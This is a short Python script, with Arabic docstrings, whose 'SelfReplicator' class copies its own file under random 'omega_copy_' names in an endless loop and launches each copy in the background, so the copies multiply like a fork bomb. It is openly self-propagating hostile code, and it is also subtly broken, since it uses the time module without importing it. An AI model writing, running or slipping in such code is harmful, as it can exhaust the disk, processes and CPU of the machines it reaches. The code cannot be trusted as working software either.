import os
import shutil
import hashlib

class SelfReplicator:
    def __init__(self):
        self.replication_count = 0
        self.replication_speed = 0.000001

    def replicate(self):
        """تكاثر الأسكربت ذاتياً"""
        print("🔄 Script self-replicating...")
        while True:
            new_script = self.create_copy()
            self.deploy_copy(new_script)
            self.replication_count += 1
            time.sleep(self.replication_speed)
        return True

    def create_copy(self):
        """إنشاء نسخة من الأسكربت"""
        print("🔄 Creating copy...")
        source = __file__
        new_name = f"omega_copy_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.py"
        shutil.copy(source, new_name)
        return new_name

    def deploy_copy(self, script_path):
        """نشر النسخة"""
        print(f"🔄 Deploying {script_path}...")
        os.system(f"python {script_path} &")
        return True